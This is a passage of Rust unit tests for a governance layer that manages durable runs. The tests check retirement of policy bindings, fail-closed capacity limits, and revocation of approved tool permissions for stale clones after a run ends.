                ..
            })
        ));

        let mut reconcile = governance
            .start_durable_run("session", "reconcile-run", crate::DurabilityMode::Sync)
            .unwrap();
        let (activity_id, attempt) = match reconcile
            .prepare_activity(
                "external-write",
                "logical-write",
                json!({"value": 1}),
                crate::durability::SideEffectClass::ReconcileRequired,
                None,
            )
            .unwrap()
        {
            crate::durability::ActivityDecision::Execute {
                activity_id,
                attempt,
                ..
            } => (activity_id, attempt),
            other => panic!("expected activity execution, got {other:?}"),
        };
        reconcile
            .fail_activity(&activity_id, attempt, "ambiguous outcome", true, true)
            .unwrap();
        assert!(matches!(
            governance.retire_durable_run(&reconcile),
            Err(DurableApproverError::RunNotTerminal {
                status: crate::DurableRunStatus::ReconcileRequired,
                ..
            })
        ));

        let bindings = governance.durable_bindings.read().unwrap();
        assert!(bindings.contains_key("running-run"));
        assert!(bindings.contains_key("paused-run"));
        assert!(bindings.contains_key("reconcile-run"));
    }

    #[test]
    fn terminal_retirement_is_exact_and_idempotent() {
        let policy = snapshot(PolicyEffect::Allow);
        let governance = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy.clone());
        let mut exact = governance
            .start_durable_run("session", "terminal-run", crate::DurabilityMode::Sync)
            .unwrap();
        exact.complete_run("completed").unwrap();

        let wrong_binding = GovernanceBinding::seal(
            snapshot(PolicyEffect::Deny).hash(),
            None,
            None,
            "terminal-run",
        )
        .unwrap();
        let mut wrong = crate::durability::RunState::new_with_governance_binding(
            "session",
            "terminal-run",
            crate::DurabilityMode::Sync,
            wrong_binding,
        )
        .unwrap();
        wrong.complete_run("completed").unwrap();
        assert!(matches!(
            governance.retire_durable_run(&wrong),
            Err(DurableApproverError::BindingMismatch(_))
        ));
        assert_eq!(
            governance
                .durable_bindings
                .read()
                .unwrap()
                .get("terminal-run"),
            exact.governance_binding()
        );

        governance.retire_durable_run(&exact).unwrap();
        governance.retire_durable_run(&exact).unwrap();
        assert!(!governance
            .durable_bindings
            .read()
            .unwrap()
            .contains_key("terminal-run"));
        assert_eq!(exact.policy_snapshot_hash(), Some(policy.hash()));
    }

    #[test]
    fn binding_capacity_fails_closed_and_terminal_retirement_reopens_one_slot() {
        let policy = snapshot(PolicyEffect::Allow);
        let governance = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy.clone());
        let mut retired = governance
            .start_durable_run("session", "capacity-retire", crate::DurabilityMode::Sync)
            .unwrap();
        retired.complete_run("completed").unwrap();

        {
            let mut bindings = governance.durable_bindings.write().unwrap();
            for index in 1..MAX_REGISTERED_DURABLE_BINDINGS {
                let run_id = format!("capacity-{index}");
                let binding =
                    GovernanceBinding::seal(policy.hash(), None, None, run_id.clone()).unwrap();
                bindings.insert(run_id, binding);
            }
            assert_eq!(bindings.len(), MAX_REGISTERED_DURABLE_BINDINGS);
        }

        let error = governance
            .start_durable_run("session", "overflow-run", crate::DurabilityMode::Sync)
            .unwrap_err();
        assert!(matches!(
            error,
            crate::durability::DurabilityError::InvalidEvent { ref reason }
                if reason.contains("fail-closed capacity")
        ));
        assert_eq!(
            governance.durable_bindings.read().unwrap().len(),
            MAX_REGISTERED_DURABLE_BINDINGS
        );

        governance.retire_durable_run(&retired).unwrap();
        assert_eq!(
            governance.durable_bindings.read().unwrap().len(),
            MAX_REGISTERED_DURABLE_BINDINGS - 1
        );
        let replacement = governance
            .start_durable_run("session", "replacement-run", crate::DurabilityMode::Sync)
            .unwrap();
        assert_eq!(replacement.run_id(), "replacement-run");
        assert_eq!(
            governance.durable_bindings.read().unwrap().len(),
            MAX_REGISTERED_DURABLE_BINDINGS
        );
    }

    #[tokio::test]
    async fn retired_binding_revokes_stale_clone_and_clears_reusable_approval() {
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(snapshot(PolicyEffect::Ask));
        let run = Arc::new(Mutex::new(
            base.start_durable_run("session", "retired-run", crate::DurabilityMode::Sync)
                .unwrap(),
        ));
        let governance = base
            .with_durable_approver(
                Arc::new(FixedApprover {
                    decision: ApprovalDecision::Allow {
                        updated_input: None,
                        updated_permissions: vec![PermissionUpdate::AllowTool],
                    },
                    calls: calls.clone(),
                }),
                run.clone(),
                Duration::from_secs(1),
            )
            .unwrap();
        let context = |tool_use_id: &str| AuthorizationContext {
            run_id: "retired-run".into(),
            turn: 1,
            tool_use_id: tool_use_id.into(),
            tool: "network.fetch".into(),
            input: json!({"url": "https://example.com"}),
        };
        assert!(matches!(
            governance
                .authorize_detailed_with_context(context("approved"))
                .await
                .authorization,
            Authorization::Allowed(_)
        ));
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 1);
        assert_eq!(
            governance.approved_permissions.read().unwrap().grants.len(),
            1
        );
        let stale_clone = governance.clone();

        run.lock().unwrap().complete_run("completed").unwrap();
        governance.retire_durable_run(&run.lock().unwrap()).unwrap();
        assert!(governance
            .approved_permissions
            .read()
            .unwrap()
            .grants
            .is_empty());

        let report = stale_clone
            .authorize_detailed_with_context(context("after-retirement"))
            .await;
        assert!(report.interrupt);
        assert_eq!(report.permission_outcome, "binding_mismatch");
        assert!(matches!(report.authorization, Authorization::Denied { .. }));
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 1);
        assert!(matches!(
            stale_clone.with_durable_run(run),
            Err(DurableApproverError::RunTerminal { ref run_id }) if run_id == "retired-run"
        ));
    }
}
